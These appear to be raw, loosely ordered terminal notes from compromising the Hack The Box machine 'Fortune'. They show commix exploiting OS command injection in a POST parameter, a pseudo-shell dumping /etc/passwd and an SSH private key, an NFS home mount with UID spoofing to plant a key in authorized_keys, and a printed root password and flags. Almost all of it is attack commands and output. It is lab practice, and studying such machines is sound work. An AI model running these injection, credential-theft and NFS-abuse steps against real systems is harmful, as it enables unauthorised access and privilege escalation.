@@ -1,0 +1,410 @@
+SCP Client - Multiple Vulnerabilities (SSHtranger Things) 
+python3 /usr/share/exploitdb/exploits/multiple/remote/46193.py -h
+
+
+oot@kali:~# commix -u http://10.10.10.127/select -d 'db=fortune' --ignore-redirects -v 1
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v2.7-stable
+/\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)
+
++--
+Automated All-in-One OS Command Injection and Exploitation Tool
+Copyright (c) 2014-2018 Anastasios Stasinopoulos (@ancst)
++--
+
+(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+
+[*] Creating HTTP requests opener object.
+[*] Checking connection to the target URL... [ SUCCEED ]
+[*] Identifing the indicated web-page charset... [ SUCCEED ]
+[+] The indicated web-page charset appears to be utf-8.
+[*] Identifying the target operating system... [ SUCCEED ]
+[+] The target operating system appears to be Unix-Like (Openbsd).
+[*] Identifying the target server... [ FAILED ]
+[!] Warning: The server which was identified as 'OpenBSD httpd' seems unknown.
+[*] Identifying the target application ... [ FAILED ]
+[!] Warning: Heuristics have failed to identify target application.
+[*] Setting the POST parameter 'db' for tests.
+[*] Estimating the target URL response time... [ SUCCEED ]
+[*] Testing the (results-based) classic command injection technique... 
+    |_ echo%20XRIOUD$((98%2B21))$(echo%20XRIOUD)XRIOUD
+    |_ ;echo%20LWQTAM$((48%2B93))$(echo%20LWQTAM)LWQTAM
+[*] Identified the following injection point with a total of 3 HTTP(S) requests.
+[+] The POST parameter 'db' seems injectable via (results-based) classic command injection technique.
+    [~] Payload: ;echo LWQTAM$((48+93))$(echo LWQTAM)LWQTAM
+
+[?] Do you want a Pseudo-Terminal shell? [Y/n] > y
+
+Pseudo-Terminal (type '?' for available options)
+commix(os_shell) > ls
+[*] Executing the 'ls' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(ls)$(echo%20LWQTAM)LWQTAM
+
+__pycache__ fortuned.ini fortuned.log fortuned.pid fortuned.py templates wsgi.py
+
+commix(os_shell) > locate user.txt
+[*] Executing the 'locate user.txt' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(locate%20user.txt)$(echo%20LWQTAM)LWQTAM
+
+[x] Critical: The 'locate user.txt' command, does not return any output.
+
+commix(os_shell) > ls fortuned.log
+[*] Executing the 'ls fortuned.log' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(ls%20fortuned.log)$(echo%20LWQTAM)LWQTAM
+
+fortuned.log
+
+commix(os_shell) > ls /fortuned.log
+[*] Executing the 'ls /fortuned.log' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(ls%20/fortuned.log)$(echo%20LWQTAM)LWQTAM
+
+[x] Critical: The 'ls /fortuned.log' command, does not return any output.
+
+commix(os_shell) > 
+
+
+root@kali:~/HTB/Fortune# commix -u http://10.10.10.127/select -d 'db=fortune' --ignore-redirects --all -v 1
+                                      __           
+   ___   ___     ___ ___     ___ ___ /\_\   __  _   
+ /`___\ / __`\ /' __` __`\ /' __` __`\/\ \ /\ \/'\  v2.7-stable
+/\ \__//\ \L\ \/\ \/\ \/\ \/\ \/\ \/\ \ \ \\/>  </  
+\ \____\ \____/\ \_\ \_\ \_\ \_\ \_\ \_\ \_\/\_/\_\ https://commixproject.com
+ \/____/\/___/  \/_/\/_/\/_/\/_/\/_/\/_/\/_/\//\/_/ (@commixproject)
+
++--
+Automated All-in-One OS Command Injection and Exploitation Tool
+Copyright (c) 2014-2018 Anastasios Stasinopoulos (@ancst)
++--
+
+(!) Legal disclaimer: Usage of commix for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.
+
+[*] Creating HTTP requests opener object.
+[*] Checking connection to the target URL... [ SUCCEED ]
+[*] Identifing the indicated web-page charset... [ SUCCEED ]
+[+] The indicated web-page charset appears to be utf-8.
+[*] Identifying the target operating system... [ SUCCEED ]
+[+] The target operating system appears to be Unix-Like (Openbsd).
+[*] Identifying the target server... [ FAILED ]
+[!] Warning: The server which was identified as 'OpenBSD httpd' seems unknown.
+[*] Identifying the target application ... [ FAILED ]
+[!] Warning: Heuristics have failed to identify target application.
+[*] Estimating the target URL response time... [ SUCCEED ]
+[*] A previously stored session has been held against that host.
+[?] Do you want to resume to the (results-based) classic command injection point? [Y/n] > y
+[+] The POST parameter 'db' seems injectable via (results-based) classic command injection technique.
+    [~] Payload: ;echo LWQTAM$((48+93))$(echo LWQTAM)LWQTAM
+[*] Executing the 'hostname' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(hostname)$(echo%20LWQTAM)LWQTAM
+[+] The hostname is fortune.htb.
+[*] Executing the 'whoami' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(whoami)$(echo%20LWQTAM)LWQTAM
+[*] Executing the 'echo $(id -u)' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(echo%20$(id%20-u))$(echo%20LWQTAM)LWQTAM
+[+] The current user is _fortune and it is not privileged.
+[*] Executing the 'uname -s' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(uname%20-s)$(echo%20LWQTAM)LWQTAM
+[*] Executing the 'echo $(lsb_release -sir)' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(echo%20$(lsb_release%20-sir))$(echo%20LWQTAM)LWQTAM
+[*] Executing the 'uname -m' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(uname%20-m)$(echo%20LWQTAM)LWQTAM
+[+] The target operating system is OpenBSD and the hardware platform is amd64.
+[*] Executing the 'echo $(awk -F ':' '{print $1}{print $3}{print $6}' /etc/passwd)' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(echo%20$(awk%20-F%20':'%20'{print%20$1}{print%20$3}{print%20$6}'%20/etc/passwd))$(echo%20LWQTAM)LWQTAM
+[*] Fetching '/etc/passwd' to enumerate users entries... [ SUCCEED ]
+[+] Identified 71 entries in '/etc/passwd'.
+    (1) 'root' is root user (uid=0). Home directory is in '/root'.
+    (2) 'daemon' is system user (uid=1). Home directory is in '/root'.
+    (3) 'operator' is system user (uid=2). Home directory is in '/operator'.
+    (4) 'bin' is system user (uid=3). Home directory is in '/'.
+    (5) 'build' is system user (uid=21). Home directory is in '/var/empty'.
+    (6) 'sshd' is system user (uid=27). Home directory is in '/var/empty'.
+    (7) '_portmap' is system user (uid=28). Home directory is in '/var/empty'.
+    (8) '_identd' is system user (uid=29). Home directory is in '/var/empty'.
+    (9) '_rstatd' is system user (uid=30). Home directory is in '/var/empty'.
+    (10) '_rusersd' is system user (uid=32). Home directory is in '/var/empty'.
+    (11) '_fingerd' is system user (uid=33). Home directory is in '/var/empty'.
+    (12) '_x11' is system user (uid=35). Home directory is in '/var/empty'.
+    (13) '_switchd' is system user (uid=49). Home directory is in '/var/empty'.
+    (14) '_traceroute' is system user (uid=50). Home directory is in '/var/empty'.
+    (15) '_ping' is system user (uid=51). Home directory is in '/var/empty'.
+    (16) '_rebound' is system user (uid=52). Home directory is in '/var/empty'.
+    (17) '_unbound' is system user (uid=53). Home directory is in '/var/unbound'.
+    (18) '_dpb' is system user (uid=54). Home directory is in '/var/empty'.
+    (19) '_pbuild' is system user (uid=55). Home directory is in '/nonexistent'.
+    (20) '_pfetch' is system user (uid=56). Home directory is in '/nonexistent'.
+    (21) '_pkgfetch' is system user (uid=57). Home directory is in '/nonexistent'.
+    (22) '_pkguntar' is system user (uid=58). Home directory is in '/nonexistent'.
+    (23) '_spamd' is system user (uid=62). Home directory is in '/var/empty'.
+    (24) 'www' is system user (uid=67). Home directory is in '/var/www'.
+    (25) '_isakmpd' is system user (uid=68). Home directory is in '/var/empty'.
+    (26) '_syslogd' is system user (uid=73). Home directory is in '/var/empty'.
+    (27) '_pflogd' is system user (uid=74). Home directory is in '/var/empty'.
+    (28) '_bgpd' is system user (uid=75). Home directory is in '/var/empty'.
+    (29) '_tcpdump' is system user (uid=76). Home directory is in '/var/empty'.
+    (30) '_dhcp' is system user (uid=77). Home directory is in '/var/empty'.
+    (31) '_mopd' is system user (uid=78). Home directory is in '/var/empty'.
+    (32) '_tftpd' is system user (uid=79). Home directory is in '/var/empty'.
+    (33) '_rbootd' is system user (uid=80). Home directory is in '/var/empty'.
+    (34) '_ppp' is system user (uid=82). Home directory is in '/var/empty'.
+    (35) '_ntp' is system user (uid=83). Home directory is in '/var/empty'.
+    (36) '_ftp' is system user (uid=84). Home directory is in '/var/empty'.
+    (37) '_ospfd' is system user (uid=85). Home directory is in '/var/empty'.
+    (38) '_hostapd' is system user (uid=86). Home directory is in '/var/empty'.
+    (39) '_dvmrpd' is system user (uid=87). Home directory is in '/var/empty'.
+    (40) '_ripd' is system user (uid=88). Home directory is in '/var/empty'.
+    (41) '_relayd' is system user (uid=89). Home directory is in '/var/empty'.
+    (42) '_ospf6d' is system user (uid=90). Home directory is in '/var/empty'.
+    (43) '_snmpd' is system user (uid=91). Home directory is in '/var/empty'.
+    (44) '_ypldap' is system user (uid=93). Home directory is in '/var/empty'.
+    (45) '_rad' is system user (uid=94). Home directory is in '/var/empty'.
+    (46) '_smtpd' is system user (uid=95). Home directory is in '/var/empty'.
+    (47) '_rwalld' is system user (uid=96). Home directory is in '/var/empty'.
+    (48) '_nsd' is system user (uid=97). Home directory is in '/var/empty'.
+    (49) '_ldpd' is system user (uid=98). Home directory is in '/var/empty'.
+    (50) '_sndio' is anonymous user (uid=99). Home directory is in '/var/empty'.
+    (51) '_ldapd' is regular user (uid=100). Home directory is in '/var/empty'.
+    (52) '_iked' is regular user (uid=101). Home directory is in '/var/empty'.
+    (53) '_iscsid' is regular user (uid=102). Home directory is in '/var/empty'.
+    (54) '_smtpq' is regular user (uid=103). Home directory is in '/var/empty'.
+    (55) '_file' is regular user (uid=104). Home directory is in '/var/empty'.
+    (56) '_radiusd' is regular user (uid=105). Home directory is in '/var/empty'.
+    (57) '_eigrpd' is regular user (uid=106). Home directory is in '/var/empty'.
+    (58) '_vmd' is regular user (uid=107). Home directory is in '/var/empty'.
+    (59) '_tftp_proxy' is regular user (uid=108). Home directory is in '/nonexistent'.
+    (60) '_ftp_proxy' is regular user (uid=109). Home directory is in '/nonexistent'.
+    (61) '_sndiop' is regular user (uid=110). Home directory is in '/var/empty'.
+    (62) '_syspatch' is regular user (uid=112). Home directory is in '/var/empty'.
+    (63) '_slaacd' is regular user (uid=115). Home directory is in '/var/empty'.
+    (64) '_postgresql' is regular user (uid=503). Home directory is in '/var/postgresql'.
+    (65) '_pgadmin4' is regular user (uid=511). Home directory is in '/usr/local/pgadmin4'.
+    (66) '_fortune' is regular user (uid=512). Home directory is in '/var/appsrv/fortune'.
+    (67) '_sshauth' is regular user (uid=513). Home directory is in '/var/appsrv/sshauth'.
+    (68) 'nobody' is regular user (uid=32767). Home directory is in '/nonexistent'.
+    (69) 'charlie' is regular user (uid=1000). Home directory is in '/home/charlie'.
+    (70) 'bob' is regular user (uid=1001). Home directory is in '/home/bob'.
+    (71) 'nfsuser' is regular user (uid=1002). Home directory is in '/home/nfsuser'.
+[*] Executing the 'echo $(cat /etc/shadow)' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(echo%20$(cat%20/etc/shadow))$(echo%20LWQTAM)LWQTAM
+[*] Fetching '/etc/shadow' to enumerate users password hashes... [ FAILED ]
+[!] Warning: It seems that you don't have permissions to read '/etc/shadow' to enumerate users password hashes.
+
+[?] Do you want a Pseudo-Terminal shell? [Y/n] > y
+
+Pseudo-Terminal (type '?' for available options)
+commix(os_shell) > ?
+
+---[ Available options ]---     
+Type '?' to get all the available options.
+Type 'back' to move back from the current context.
+Type 'quit' (or use <Ctrl-C>) to quit commix.
+Type 'reverse_tcp' to get a reverse TCP connection.
+Type 'bind_tcp' to set a bind TCP connection.
+
+commix(os_shell) > 
+
+commix(os_shell) > cat /home/bob/ca/index.txt
+[*] Executing the 'cat /home/bob/ca/index.txt' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(cat%20/home/bob/ca/index.txt)$(echo%20LWQTAM)LWQTAM
+
+V 281027005643Z 1000 unknown /C=CA/ST=ON/O=Fortune Co HTB/CN=Fortune Intermediate CA/emailAddress=bob@fortune.htb
+
+commix(os_shell) > cat /home/bob/ca/certs/ca.cert.pem
+[*] Executing the 'cat /home/bob/ca/certs/ca.cert.pem' command... 
+    |_ ;echo%20LWQTAM$(echo%20LWQTAM)$(cat%20/home/bob/ca/certs/ca.cert.pem)$(echo%20LWQTAM)LWQTAM
+
+-----BEGIN CERTIFICATE----- MIIFwDCCA6igAwIBAgIJANds3weRvHdYMA0GCSqGSIb3DQEBCwUAMG0xCzAJBgNV BAYTAkNBMQswCQYDVQQIDAJPTjEXMBUGA1UECgwORm9ydHVuZSBDbyBIVEIxGDAW BgNVBAMMD0ZvcnR1bmUgUm9vdCBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1 bmUuaHRiMB4XDTE4MTAzMDAwNDQyN1oXDTM4MTAyNTAwNDQyN1owbTELMAkGA1UE BhMCQ0ExCzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYG A1UEAwwPRm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVu ZS5odGIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC7ZiMApet/YLqV F7hrjvzT3KxKcANBBvoml5hI1O1v3J8HbqZIoNxs2+klqOPQW42/TlezL7t2tj7I vYP3ZXAfrX4roVGZWaaeewoe5kZ/jZjzz1vELOVfFjo9kHBA2Cg+bm7xTvTTsFd8 kfjZVPfATxHldL9sLIRVEy/HuHUKBVV/O7jIyRSIWK987C8e/mKFbHAmF6iMZa4k 3nmhC77glBZ7m8sKROzZ9g3zMbPu+tES3V2fOeIyJhqZzpSWvpQJ8kbiIXmtDbST l2tWFPyA7QtZN7RI+Z+fI79s3DTDMM59LnW4LIlQzq9vDcwtFoPmlg65dJiA1BMx fxmUTSXkzBSwM0wwaGx02JQryKKhZeVq8hqpZwZrDeV963NOByKvbR5OFsUbfWBX qWTEApx3mOSgEz4OHhyOgNeoB0GL5EG7HWjQoTS5tKpyfE/09m7iUiIEubbYIaLR T9kkgeJhIB9aENYUR8DYS65k3gNTXJy+4HX5jX+jZW8DOtLHB4wvJi9IdKF6usnn VWmvgWnWYeW9KXGnGYUbMc2P/CIUtXaCTxcagxF6QsbOtqp4cEOhzA3F22+yNgB+ oHS/U/lycRFivCULjSwsj6KZ4HlVB5CorNz77K7wtWxfFRUPLq/sgtoo0tcAqHIQ YaFf/NSGVp57+Q1nS2WMd2taCG8SEQIDAQABo2MwYTAdBgNVHQ4EFgQUU502tIYT 4hxJAmzVRMiiBInaLlYwHwYDVR0jBBgwFoAUU502tIYT4hxJAmzVRMiiBInaLlYw DwYDVR0TAQH/BAUwAwEB/zAOBgNVHQ8BAf8EBAMCAYYwDQYJKoZIhvcNAQELBQAD ggIBAHxvVUpJzigb1ZNgZ0k3Ul+tgQZyBiUL84aHAhzrVnSmNN+fb2ra6m++u2LC zNjrHl5T2C8Fg7CHT9BWK/gxA0lacGlmYKoehehLZJdQWtlBqYZ7k9Hh4FpDhdce liIlP3xbL8nMiEQ7v1jBd+JpzgVX1KPLfDErf0cWL0aOlkU11/IEnfFSK0fF46Zv NhYnDJIGpJ2xzoEe5dJZloix2o7/mTTx9osMTTaTi7WP6cilXxmftAREVs9EabB0 SqnY2HdXZ1oVl/5KUWKXUwgUCaevJJG+EUKNVkT8pcbhCcz5miFRhkcUK+BusY0t ltqaZIi+KQly25Enq+o9Lz+XQWOmXAs8ZBlZNWrsxzQQ5ZDj6Tx/Aobrb3reoOG0 wHCbgw9owXpgCxYemZpiZtR0OyvRYn8WeWJEelRcLCKEdDABOvod1LeQRtc0Vd/o Jf4DpgM90ApPVmHdVh2ovxdZHogyOlbK2b803ckDgxDlhKEp848Y5Blh7VU+3dXM Zd7SBUmdBmlAaOFfAQkIIYDiSRHifuDohBL2354EJMBUMeOou0AImwSzN1YYrzI8 RmSdo5bKEBfuHf5Y63E83cz6RvQEt09nPoqxkSLnB9WSLAQGp1OwOAPWmZsBdNZU +XJk0QwM6hKWfnExxAGj4OkL2rvsgYxIffqEHOaF6wgwQjTC -----END CERTIFICATE-----
+
+commix(os_shell) > 
+
+
+[*] Executing the 'echo "/var/appsrv/fortune/id_rsa" | ssh-keygen -t rsa -C bob@fortune.htb' command... 
+    |_ ;echo%20WRWIHU$(echo%20WRWIHU)$(echo%20"/var/appsrv/fortune/id_rsa"%20|%20ssh-keygen%20-t%20rsa%20-C%20bob@fortune.htb)$(echo%20WRWIHU)WRWIHU
+
+Generating public/private rsa key pair. Enter file in which to save the key (/var/appsrv/fortune/.ssh/id_rsa): /var/appsrv/fortune/id_rsa already exists. Overwrite (y/n)? 
+
+commix(os_shell) > cat /var/appsrv/fortune/id_rsa
+[*] Executing the 'cat /var/appsrv/fortune/id_rsa' command... 
+    |_ ;echo%20WRWIHU$(echo%20WRWIHU)$(cat%20/var/appsrv/fortune/id_rsa)$(echo%20WRWIHU)WRWIHU
+
+-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEArxQRksckL9BLo6N+p3wrTz16sxwbQ4AhdiEbnWq+j4HRPnJSPQzO Vd99A3JGD5fe0nGdceKDgwVOwYqxSxkEoKci2jOC5/v/jZlNwId+7jqsl/R2Ea11tzro4t UBBrOz1krDwWSAnQzwHSB8jQYokhH+elyctZbIVQOHbsE7APEMzXTjN/rsdqifsk+lYq5c /CBXeB+oHg+zjfa8rS9MqZ7z3D/ypRw4GjtOAFGc3H+lFKGeEj6h8Wxh3dYti3wBaVtyeG tpbI8wIeo1JPuq1k64B49V3sh/rS25ZAVZIiTyJwXq3+GQamd4Ej1Lh/LcSnVdhC5oA2Bi HfK95F8cRQAAA8hboCulW6ArpQAAAAdzc2gtcnNhAAABAQCvFBGSxyQv0Eujo36nfCtPPX qzHBtDgCF2IRudar6PgdE+clI9DM5V330DckYPl97ScZ1x4oODBU7BirFLGQSgpyLaM4Ln +/+NmU3Ah37uOqyX9HYRrXW3Ouji1QEGs7PWSsPBZICdDPAdIHyNBiiSEf56XJy1lshVA4 duwTsA8QzNdOM3+ux2qJ+yT6Virlz8IFd4H6geD7ON9rytL0ypnvPcP/KlHDgaO04AUZzc f6UUoZ4SPqHxbGHd1i2LfAFpW3J4a2lsjzAh6jUk+6rWTrgHj1XeyH+tLblkBVkiJPInBe rf4ZBqZ3gSPUuH8txKdV2ELmgDYGId8r3kXxxFAAAAAwEAAQAAAQA7Dr76zxgi1NWfBnij 0JvfZ/Kq1nFP7Lnc2kAxcp+DUxwdP30EQPydNP07m2GMwwMT4+VjVDBekvzFBp7VoUPRWW /FQRkIXhYPUsZKiqpDfCFaRMlLH0MVItcKJSXqd9XTFHdCFj/YOlQIzzuUap5m35EC/5iR HKLJIp6duqrHnvmEEUf3pXITaX4zLOOZqhDfyzoy8NmW+6LiWu2AThbOAZij0M9DVWfya8 ickKWf6yKkUY2MdTrI35r5MHO6dc8bfmkgoddPs/ofqMU8ewYMksFN0g5Sbb4X2VWV2zsW gdwIa4zWpmMpHY5pao+S9WJWNDbTXEIn63Ima+U7/TolAAAAgFeKt7xgcl2a8er3DQ3dOR piFVaCR37Xi8BzhSSueJ1AOGhNHf9DjCW+oymvs8T9FjGZEONgvUXbEK08XqRPPyoHkSOo JS6VN1yFWentgtcyPIP+F3XsdU4D4BjXYyL29doc4RcQSxtTPo6VQUNm5v70c9WoW9PEze TMOuveNjLSAAAAgQDXWjUKqnPOgAbN3pC3nwzCp6ekERmgYIKtLU87E9JqRMsKWnh8UDt4 29JTrR+c78R91Mn5j09Y8ylVD9jAod4FV2RsLKufri+MyZszoqgOHOvtJOJ7Q9GKk1vRDd 9m483caJo3w4KL04w0yU80r6l7sbmQ0vDgvZ9ZVYMMVxDKIwAAAIEA0B/UQV1ZnFaLAu4r ohr4yGKq3ZkhPLiXjX5b+52DYwAuVU0A8dS/ou6+FEWV9NkAX1CPyj02viW16gsydoZnmS Nr8OssBwHhw9e/ir3DktD6Cnb8/HWzCNCYKhjtOlUSiVIs3/suHhsaloXFmwNyKKh/zZPN ix1v2360pSatoncAAAAPYm9iQGZvcnR1bmUuaHRiAQIDBA== -----END OPENSSH PRIVATE KEY-----
+
+commix(os_shell) > ls -a
+[*] Executing the 'ls -a' command... 
+    |_ ;echo%20WRWIHU$(echo%20WRWIHU)$(ls%20-a)$(echo%20WRWIHU)WRWIHU
+
+. .. __pycache__ fortuned.ini fortuned.log fortuned.pid fortuned.py templates wsgi.py
+
+commix(os_shell) > cat /var/appsrv/fortune/id_rsa.pub
+[*] Executing the 'cat /var/appsrv/fortune/id_rsa.pub' command... 
+    |_ ;echo%20WRWIHU$(echo%20WRWIHU)$(cat%20/var/appsrv/fortune/id_rsa.pub)$(echo%20WRWIHU)WRWIHU
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvFBGSxyQv0Eujo36nfCtPPXqzHBtDgCF2IRudar6PgdE+clI9DM5V330DckYPl97ScZ1x4oODBU7BirFLGQSgpyLaM4Ln+/+NmU3Ah37uOqyX9HYRrXW3Ouji1QEGs7PWSsPBZICdDPAdIHyNBiiSEf56XJy1lshVA4duwTsA8QzNdOM3+ux2qJ+yT6Virlz8IFd4H6geD7ON9rytL0ypnvPcP/KlHDgaO04AUZzcf6UUoZ4SPqHxbGHd1i2LfAFpW3J4a2lsjzAh6jUk+6rWTrgHj1XeyH+tLblkBVkiJPInBerf4ZBqZ3gSPUuH8txKdV2ELmgDYGId8r3kXxxF bob@fortune.htb
+
+fileix(os_shell) > ssh-keygen -s /var/appsrv/fortune/id_rsa  
+
+COPY intermediate.cert.pem and intermediate.key.pem from the RCEd service
+
+
+root@kali: openssl pkcs12 -export -out Cert.p12 -in intermediate.cert.pem -inkey intermediate.key.pem -passin pass:root -passout pass:root
+
+
+OBTAIN SSHKEY'S FROM /generate webpage on port 443
+
+
+
+root@kali:~/HTB/Fortune/intermediate# ssh -i id_rsa fortune.htb
+root@fortune.htb: Permission denied (publickey,keyboard-interactive).
+root@kali:~/HTB/Fortune/intermediate# ssh -i id_rsa nfsuser@fortune.htb
+Last login: Wed Mar 27 06:48:30 2019 from 10.10.14.211
+
+Hello nfsuser. You are authenticated from host "10.10.13.167"
+
+
+
+root@kali:~# useradd charlie
+
+
+root@kali:~/HTB/Fortune# mkdir mntt
+root@kali:~/HTB/Fortune# mount -t nfs -o rw,auto,noatime 10.10.10.127:/home mntt
+root@kali:~/HTB/Fortune# ls
+dirb.txt     id_rsa        logs.txt  mntt
+Fortune.txt  intermediate  mnt       nmap.txt
+root@kali:~/HTB/Fortune# cd mntt
+root@kali:~/HTB/Fortune/mntt# su charlie
+$ ls -a
+.  ..  bob  charlie  nfsuser
+$ cd charlie
+sh: 2: cd: can't cd to charlie
+$ sudo cd charlie
+[sudo] password for charlie: 
+sudo: cd: command not found
+$ sudo 'cd charlie'
+sudo: cd charlie: command not found
+$ ls 
+bob  charlie  nfsuser
+$ ls -al 
+total 12
+drwxr-xr-x 5 root    root     512 Nov  3 02:19 .
+drwxr-xr-x 5 root    root    4096 Mar 28 08:40 ..
+drwxr-xr-x 5 charlie charlie  512 Nov  3 21:29 bob
+drwxr-x--- 3 user    user     512 Nov  6 04:02 charlie
+drwxr-xr-x 2    1002    1002  512 Nov  3 03:39 nfsuser
+$ su user
+Password: 
+user@kali:/root/HTB/Fortune/mntt$ cd charlie
+user@kali:/root/HTB/Fortune/mntt/charlie$ ls
+mbox  user.txt
+user@kali:/root/HTB/Fortune/mntt/charlie$ cat user.txt
+ada0affd040090a6daede65f10737c40
+user@kali:/root/HTB/Fortune/mntt/charlie$ 
+
+
+
+ser@kali:/root/HTB/Fortune/mnt/charlie$ cat mbox
+From bob@fortune.htb Sat Nov  3 11:18:51 2018
+Return-Path: <bob@fortune.htb>
+Delivered-To: charlie@fortune.htb
+Received: from localhost (fortune.htb [local])
+	by fortune.htb (OpenSMTPD) with ESMTPA id bf12aa53
+	for <charlie@fortune.htb>;
+	Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+From:  <bob@fortune.htb>
+Date: Sat, 3 Nov 2018 11:18:51 -0400 (EDT)
+To: charlie@fortune.htb
+Subject: pgadmin4
+Message-ID: <196699abe1fed384@fortune.htb>
+Status: RO
+
+Hi Charlie,
+
+Thanks for setting-up pgadmin4 for me. Seems to work great so far.
+BTW: I set the dba password to the same as root. I hope you don't mind.
+
+Cheers,
+
+Bob
+
+
+oot@kali:~/HTB/Fortune# ssh -i id_rsa nfsuser@fortune.htb
+Last login: Sat Mar 30 04:05:00 2019 from 10.10.13.73
+
+Hello nfsuser. You are authenticated from host "10.10.13.162"
+
+
+root@kali:~/HTB/Fortune# ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): /root/HTB/Fortune/newkey
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/HTB/Fortune/newkey.
+Your public key has been saved in /root/HTB/Fortune/newkey.pub.
+The key fingerprint is:
+SHA256:yxwqD/4ptzEltfZKC1NQ3U9Jwn0wnlRrwNsZcZgP3nI root@kali
+The key's randomart image is:
++---[RSA 2048]----+
+|        .. oo+=B+|
+|       .  . o=O++|
+|      . .    +=Bo|
+|       o .   .=oE|
+|      . S      o |
+|       O +       |
+|    o * = .      |
+|   ..+.B o       |
+|    .+=.o        |
++----[SHA256]-----+
+
+
+root@kali:~/HTB/Fortune# cat newkey.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK/WXEDHkIwGoIVyT8K6fUj6pfN0bmhzD7mutlIMLChMgywsPpczGq/YTetQly8GHcFSOs8Xk3EdDk6Is3Aqe91+0KvWxdRHSFKKZYaIfI5xjDcwr1YBnXPk/J/bSup4TXnD/mRMFNe4vyDfYSr0nXMSBg+JqWmWqCjGK0BuKWFsTpjxfw8P4PqzMes2gYj5+Df84CHGshVJQ/zVrHUacS/PhaHM9w4fjai8ap+mENNt1B1LTLCqfYxdawP4Q4rYliY8sSg7Movf+taHfHmqrIoXZo41S5mTvodJPvwguSpOPY5bpJATU/XJ7oy7sy+oxJtgSO7DdPBYM518wSLnGH root@kali
+
+
+
+oot@kali:~# cd HTB/Fortune
+root@kali:~/HTB/Fortune# mount 10.10.10.127:/home mnt
+root@kali:~/HTB/Fortune# cd mnt
+root@kali:~/HTB/Fortune/mnt# ls -l
+total 6
+drwxr-xr-x 5 1001 1001 512 Nov  3 21:29 bob
+drwxr-x--- 3 user user 512 Nov  6 04:02 charlie
+drwxr-xr-x 2 1002 1002 512 Nov  3 03:39 nfsuser
+root@kali:~/HTB/Fortune/mnt# su user
+user@kali:/root/HTB/Fortune/mnt$ cd charlie
+user@kali:/root/HTB/Fortune/mnt/charlie$ ls
+mbox  user.txt
+user@kali:/root/HTB/Fortune/mnt/charlie$ ls -a
+.   .cshrc  .login   mbox      .ssh	 .Xdefaults
+..  .cvsrc  .mailrc  .profile  user.txt
+user@kali:/root/HTB/Fortune/mnt/charlie$ cd .ssh
+user@kali:/root/HTB/Fortune/mnt/charlie/.ssh$ ls -a
+.  ..  authorized_keys
+user@kali:/root/HTB/Fortune/mnt/charlie/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK/WXEDHkIwGoIVyT8K6fUj6pfN0bmhzD7mutlIMLChMgywsPpczGq/YTetQly8GHcFSOs8Xk3EdDk6Is3Aqe91+0KvWxdRHSFKKZYaIfI5xjDcwr1YBnXPk/J/bSup4TXnD/mRMFNe4vyDfYSr0nXMSBg+JqWmWqCjGK0BuKWFsTpjxfw8P4PqzMes2gYj5+Df84CHGshVJQ/zVrHUacS/PhaHM9w4fjai8ap+mENNt1B1LTLCqfYxdawP4Q4rYliY8sSg7Movf+taHfHmqrIoXZo41S5mTvodJPvwguSpOPY5bpJATU/XJ7oy7sy+oxJtgSO7DdPBYM518wSLnGH root@kali" >> authorized_keys
+
+
+
+root@kali:~/HTB/Fortune# ssh -i newkey charlie@fortune.htb
+Last login: Sat Mar 30 04:06:51 2019 from 10.10.13.73
+OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
+
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+fortune$ ls -a
+.            .cshrc       .mailrc      mbox
+..           .cvsrc       .profile     user.txt
+.Xdefaults   .login       .ssh
+fortune$ su root
+Password: R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
+
+
+fortune# whoami
+root
+fortune# ls -a
+.            .cshrc       .mailrc      mbox
+..           .cvsrc       .profile     user.txt
+.Xdefaults   .login       .ssh
+fortune# find / -name root.txt
+/root/root.txt
+fortune# cat /root/root.txt
+335af7f02878890aea32d64f7ea3a0f8
+
